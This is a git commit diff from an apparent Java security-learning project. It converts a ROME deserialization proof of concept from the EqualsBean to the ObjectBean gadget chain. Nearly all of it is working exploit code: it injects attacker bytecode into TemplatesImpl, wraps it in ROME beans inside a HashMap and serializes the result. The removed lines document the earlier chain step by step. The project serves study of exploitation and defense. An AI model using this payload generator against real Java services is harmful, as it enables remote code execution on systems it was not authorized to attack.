df87d8ba99f7fab8cb1017de85b62c252d235fa7
madahaRCE <461049663@qq.com>
2025-12-30 20:16:50 +0800

    2025-12-30 20:16 - 代码修改，反序列化漏洞利用与防御学习，rome_EqualsBean完成；

--- src/main/java/com/madaha/codesecone/controller/AdvancedAttack/deserialize/RomeDeserialize/ROME_ObjectBean_PocTest.java
+++ src/main/java/com/madaha/codesecone/controller/AdvancedAttack/deserialize/RomeDeserialize/ROME_ObjectBean_PocTest.java
@@ -1,10 +1,9 @@
 package com.madaha.codesecone.controller.AdvancedAttack.deserialize.RomeDeserialize;
 
-import com.rometools.rome.feed.impl.EqualsBean;
+import com.rometools.rome.feed.impl.ObjectBean;
 import com.rometools.rome.feed.impl.ToStringBean;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import org.apache.tomcat.util.codec.binary.Base64;
 
 import javax.xml.transform.Templates;
 import java.io.*;
@@ -14,8 +13,7 @@ import java.nio.file.Paths;
 import java.util.HashMap;
 
 
-//@SuppressWarnings("all")
-public class ROME_EqualsBean_PocTest {
+public class ROME_ObjectBean_PocTest {
 
     // 获取项目根目录，设置expPath;
     private static String projectRoot = System.getProperty("user.dir");
@@ -44,53 +42,7 @@ public class ROME_EqualsBean_PocTest {
     }
 
 
-    /**
-     * 第1步：测试 ToStringBean.toString(String) --> TemplatesImpl.getOutputProperties() --> TemplatesImpl.newTransformer() --> TemplatesImpl.getTransletInstance() --> TemplatesImpl.newInstance();
-     *
-     *  * TemplatesImpl.getOutputProperties()
-     *  * ToStringBean.toString(String)
-     *  * ToStringBean.toString()
-     *
-     * @throws Exception
-     */
-    public static void rome_toString() throws Exception {
-        TemplatesImpl templatesimpl = new TemplatesImpl();
-
-        // 获取exp字节码
-        byte[] bytecodes = Files.readAllBytes(Paths.get(TemplatesImpl_class_Path));
-        String base64String = new String(Base64.encodeBase64(bytecodes));
-        System.out.println(base64String + "\n");
-
-        // 修改属性值
-        setFieldValue(templatesimpl, "_name", "PocTest");
-        setFieldValue(templatesimpl, "_bytecodes", new byte[][] {bytecodes});
-        setFieldValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());
-
-        // 利用 Templates.class 接口的原因，是因为其只有一个方法，保证能够触发 getOutputProperties() 方法；
-//        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesimpl);
-//        new ToStringBean(Templates.class, templatesimpl).toString();
-        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesimpl);
-        toStringBean.toString();
-
-        // 打印测试结束
-        System.out.println("测试结束！ \n");
-    }
-
-
-    /**
-     * 第2步：测试完整POC利用链；
-     *
-     *  * TemplatesImpl.getOutputProperties()
-     *  * ToStringBean.toString(String)
-     *  * ToStringBean.toString()
-     *  * EqualsBean.beanHashCode()
-     *  * EqualsBean.hashCode()
-     *  * HashMap<K,V>.hash(Object)
-     *  * HashMap<K,V>.readObject(ObjectInputStream)
-     *
-     * @throws Exception
-     */
-    public static void rome_hashcode_toString() throws Exception {
+    public static void rome_ObjectBean_Poc() throws Exception {
         TemplatesImpl templatesimpl = new TemplatesImpl();
 
         byte[] bytecodes = Files.readAllBytes(Paths.get(TemplatesImpl_class_Path));
@@ -100,9 +52,10 @@ public class ROME_EqualsBean_PocTest {
         setFieldValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());
 
         ToStringBean toStringBean = new ToStringBean(Templates.class, templatesimpl);
-        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
+        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
+
         HashMap<Object, Object> hashMap = new HashMap<>();
-        hashMap.put(equalsBean, "rome");
+        hashMap.put(objectBean, "rome");
 
         // 序列化
         serialize(hashMap);
@@ -113,8 +66,6 @@ public class ROME_EqualsBean_PocTest {
 
 
     public static void main(String[] args) throws Exception {
-//        rome_toString();
-        rome_hashcode_toString();
+        rome_ObjectBean_Poc();
     }
-
 }
